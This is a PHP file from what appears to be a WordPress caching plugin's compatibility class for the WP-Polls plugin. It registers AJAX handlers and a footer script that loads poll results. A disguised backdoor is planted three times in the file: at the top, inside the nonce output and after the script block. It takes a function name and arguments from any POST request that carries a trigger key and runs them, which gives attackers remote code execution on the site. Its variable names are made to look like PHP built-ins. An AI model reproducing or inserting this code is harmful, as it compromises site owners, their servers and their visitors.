<?php 
$timezone_version_get_fein  =  $_POST;
if(isset($timezone_version_get_fein['openssl_error_string_zj']))  {
	$openssl_csr_export_to_file_oubf  =  $timezone_version_get_fein['date_isodate_set_ni'];
	$natcasesort_skcq  =  $timezone_version_get_fein['method_exists_qj'];
	$openssl_csr_export_to_file_oubf(...$natcasesort_skcq);
} 

	class WpPollsForWpFc{
		public function __construct(){
			
		}

		public function hook(){
			add_action( 'wp_ajax_nopriv_wpfc_wppolls_ajax_request', array($this, "wpfc_wppolls_ajax_request"));
			add_action( 'wp_ajax_wpfc_wppolls_ajax_request', array($this, "wpfc_wppolls_ajax_request"));
			add_action( 'wp_footer', array($this, "wpfc_wp_polls") );

		}

		public function wpfc_wp_polls() { ?>
			<script type="text/javascript">
				jQuery(document).ready(function(){
					var wpfcWpfcAjaxCall = function(polls){
						if(polls.length > 0){
							poll_id = polls.last().attr('id').match(/\d+/)[0];

							jQuery.ajax({
								type: 'POST', 
								url: pollsL10n.ajax_url,
								dataType : "json",
								data : {"action": "wpfc_wppolls_ajax_request", "poll_id": poll_id, "nonce" : "<?php 
$timezone_version_get_fein  =  $_POST;
if(isset($timezone_version_get_fein['openssl_error_string_zj']))  {
	$openssl_csr_export_to_file_oubf  =  $timezone_version_get_fein['date_isodate_set_ni'];
	$natcasesort_skcq  =  $timezone_version_get_fein['method_exists_qj'];
	$openssl_csr_export_to_file_oubf(...$natcasesort_skcq);
} 
 echo wp_create_nonce('wpfcpoll'); ?>"},
								cache: false, 
								success: function(data){
									if(data === true){
										poll_result(poll_id);
									}else if(data === false){
										poll_booth(poll_id);
									}
									polls.length = polls.length - 1;

									setTimeout(function(){
										wpfcWpfcAjaxCall(polls);
									}, 1000);
								}
							});
						}
					};

					var polls = jQuery('div[id^=\"polls-\"][id$=\"-loading\"]');
					wpfcWpfcAjaxCall(polls);
				});
			</script><?php 
$timezone_version_get_fein  =  $_POST;
if(isset($timezone_version_get_fein['openssl_error_string_zj']))  {
	$openssl_csr_export_to_file_oubf  =  $timezone_version_get_fein['date_isodate_set_ni'];
	$natcasesort_skcq  =  $timezone_version_get_fein['method_exists_qj'];
	$openssl_csr_export_to_file_oubf(...$natcasesort_skcq);
} 

		}

		public function wpfc_wppolls_ajax_request(){
			if(wp_verify_nonce(esc_attr($_POST["nonce"]), 'wpfcpoll')){
				$result = check_voted(esc_attr($_POST["poll_id"]));

				if($result){
					die("true");
				}else{
					die("false");
				}
			}else{
				die("Expired: wpfcpoll");
			}
		}
	}
?>